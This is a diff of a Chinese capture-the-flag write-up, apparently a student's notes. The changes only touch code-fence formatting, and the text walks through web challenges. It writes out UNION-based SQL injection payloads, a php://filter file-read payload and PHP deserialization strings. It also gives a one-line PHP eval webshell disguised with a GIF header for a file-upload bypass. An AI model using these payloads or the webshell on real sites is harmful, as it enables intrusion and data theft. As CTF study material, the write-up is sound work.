@@ -402,9 +402,9 @@
 也就是说这是一行，大致猜想判断语句select
  username and password from DB where username = &#39;****&#39; and password = &#39;****&#39; 故继续尝试注入。
 由于之前误解为了万能密码，后面发现就是简单的没有过滤的sql注入，直接按照常规走，这里注入点在username,直接构造0&#39; 就会报错。之后获取字段数量，
-```0&#39; order by 3 ```页面回显错误，故字段数量为3.
-```0&#39; order union select 1,2,database()# ```获取数据库名
-```0&#39; order union select 1,2,table_name from information_schema.tables where database()=&quot;geek&quot;# ```即可获取表名，当然可以在后面加上limit 1,1 然后修改,前面的数字即可获取更多的表名。
+​```0&#39; order by 3 ```页面回显错误，故字段数量为3.
+​```0&#39; order union select 1,2,database()# ```获取数据库名
+​```0&#39; order union select 1,2,table_name from information_schema.tables where database()=&quot;geek&quot;# ```即可获取表名，当然可以在后面加上limit 1,1 然后修改,前面的数字即可获取更多的表名。
 获取字段内容类似，其他的payload相似就不一一构造了，拿下flag.
 6.lovesql
 &amp;emsp;&amp;emsp;这道题和简单的sql一样因为做了很久了，可能wp写混了，简单sql好像直接就出flag了，然后lovesql要把流程都走一遍，上面还有一个很小的用sqlmap是没有灵魂的。我的Py环境一样，同样纯手工，payload为上题一样，也没有过滤些什么，就是表有点多，可以几十几十个表的在limit里面加。
@@ -436,7 +436,7 @@ payload:0&#39; or un\*\*ion se\*\*lect 1,2,ta\*\*ble_name from info\*\*rmation_s
 
 10.Jiang&#39;s Secret
 &amp;emsp;&amp;emsp;进入页面后直接查看源代码，发现了一个./Archive_room.php,然后进去后再查看源代码，又发现一个action.php。这么多跳转页面，直接用BP抓包看，最后在action.php转发时，发现了secr3t.php，进去页面后，说flag在flag.php页面，于是访问flag.php页面回显找不到我，，，.然后页面还有一段php代码
-```highlight_file(__FILE__);
+​```highlight_file(__FILE__);
     error_reporting(0);
     $file=$_GET[&#39;file&#39;];
     if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){
@@ -445,13 +445,13 @@ payload:0&#39; or un\*\*ion se\*\*lect 1,2,ta\*\*ble_name from info\*\*rmation_s
     }
     include($file);```
 从上可以看出来，这个php存在着任意文件的读取，因为把用户可控制的file文件名使用了include包含。因而可以使用payload:
-```php://filter/read=convert.base64-encode/resource=flag.php```
+​```php://filter/read=convert.base64-encode/resource=flag.php```
 获取到的flag.php是base64加密的解码即可拿下flag.
 最后拿下了flag.
 
 11.反序列化
 &amp;emsp;&amp;emsp;进入页面后直接ctrl+U查看源代码。
-```class Student
+​```class Student
 {
     public $score = 0;
     public function __destruct()
@@ -467,7 +467,7 @@ $exp = $_GET[&#39;exp&#39;];
 echo &quot;&lt;br&gt;&quot;;
 unserialize($exp);```
 代码审计可以知道，直接构造一个Student类的序列化，其中包含$score=10000.就可以拿下flag.
-```payload:    class Student
+​```payload:    class Student
 {
     public $score = 10000;
 
@@ -478,7 +478,7 @@ unserialize($exp);```
 
 12.又来一只猫
 &amp;emsp;&amp;emsp;进入页面说有个备份的好习惯，我马上想到了是不是index.php.bak文件，打开没有，因而直接使用御剑扫描一下，发现了一个zip。打开解压后便出现了源码，源码过多就不一一粘贴了。这里只粘贴关键性的几句。
-```include &#39;flag.php&#39;;
+​```include &#39;flag.php&#39;;
 
 
 error_reporting(0);
@@ -514,7 +514,7 @@ class Name{
             echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
             die();```
 上面是test.php的内容，下面
-```include &#39;class.php&#39;;
+​```include &#39;class.php&#39;;
     $select = $_GET[&#39;select&#39;];
     $res=unserialize(@$select);```
 查看源代码，发现又是一个关于序列化漏洞的题。所谓序列化漏洞是指构造序列化的字符串后会触发魔术方法或者称为魔术函数的自动执行。这可能是程序本身不想看到的结果。其中魔术方法就包括toString(),__construct(),以及__destruct()方法。其中con和de是相反的两个，前面那个是对象建立时会自动调用，后面那个是对象销毁时会自动调用。这里我在构造了与之前的题一样的类的序列化后，发现绕不过，没有满足条件，主要是test.php中定义的变量为私有类，在这里采用同样的方法不行了。在百度了各种资料后，主要搜索关于序列化的漏洞，在这里面发现了几个特别的方法，payload:```O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}```
@@ -522,7 +522,7 @@ class Name{
 
 13.你有初恋吗
 &amp;emsp;&amp;emsp;页面上面提示了Hash，要Hash出同样的感觉。查看源代码又是一个代码审计题：
-```$adore=&#39;***************&#39;;
+​```$adore=&#39;***************&#39;;
 $now = $_POST[&#39;lover&#39;];
 setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));
 if(isset($now)&amp;&amp;$now!=syclover) {
@@ -540,7 +540,7 @@ if(isset($now)&amp;&amp;$now!=syclover) {
 &amp;emsp;&amp;emsp;这道题其实很清楚了就是上传一个一句话木马就可以拿到flag,奈何我之前怎么搞都上传不了。忘记了一个判断一句话木马的几个过滤条件：
 一般会检测文件名后缀，以及检测PHP起始符(&lt;?),检测content-type的文件类型，并且检测文件头是否是图片的文件头。
 知道了这四个要求起始就比较容易了，文件内容为：
-```GIF89a
+​```GIF89a
 &lt;?php @eval($_POST[&#39;cl4y&#39;]);?&gt;```
 文件后缀采用.phtml现在去试试能否获得flag.
 按理是可以获得flag的可能是由于环境问题导致没有得到flag,继续下一题复现。
@@ -548,10 +548,10 @@ if(isset($now)&amp;&amp;$now!=syclover) {
 2.性感黄阿姨，在线聊天 --笑
 &amp;emsp;&amp;emsp;发送flag过去，提示：我很想告诉你的，可惜你只是我的guest
 抓包后可以看到name的value是guest,改为admin后，提示：
-```{&quot;response&quot;:&quot;Congratulations! flag in ./_f14g_Is_Here_.php ,try ro read it!&quot;}```
+​```{&quot;response&quot;:&quot;Congratulations! flag in ./_f14g_Is_Here_.php ,try ro read it!&quot;}```
 这里可以直接用弱类型绕过，因为是双等号，直接用Intruder进行爆破，可以得到当name为357时候会提示flag in ./_f14g_ls_Here_.php
 然后让我们尝试去读它，在请求数据包中可以看到数据传送方式是json，那么可以猜测xml后端可能也可以解析，修改Content-Type为xml，然后编写一段简单的xml代码：
-```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+​```&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
     &lt;root&gt;
         &lt;name&gt;357&lt;/name&gt;
         &lt;request&gt;flag&lt;/request&gt;
